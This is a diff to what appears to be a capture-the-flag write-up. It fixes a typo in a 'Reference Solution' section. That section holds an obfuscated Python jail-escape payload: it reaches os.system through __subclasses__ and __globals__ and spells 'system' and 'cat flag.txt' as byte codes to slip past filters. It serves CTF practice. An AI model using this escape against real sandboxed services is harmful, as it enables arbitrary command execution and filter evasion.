@@ -102,7 +102,7 @@ else:
 <details>
 <summary>Reference Solution</summary>
 
-Are there simpler solution to construct a string? Yes. Does this one get you the flag? Also, yes. So why are you asking?
+Are there simpler solutions to construct a string? Yes. Does this one get you the flag? Also, yes. So why are you asking?
 
 <code>().__class__.__base__.__subclasses__()[140].__init__.__globals__[().__str__()[:0].join([i.to_bytes().decode() for i in [115, 121, 115, 116, 101, 109]])](().__str__()[:0].join([i.to_bytes().decode() for i in [99, 97, 116, 32, 102, 108, 97, 103, 46, 116, 120, 116]]))</code>
 </details>
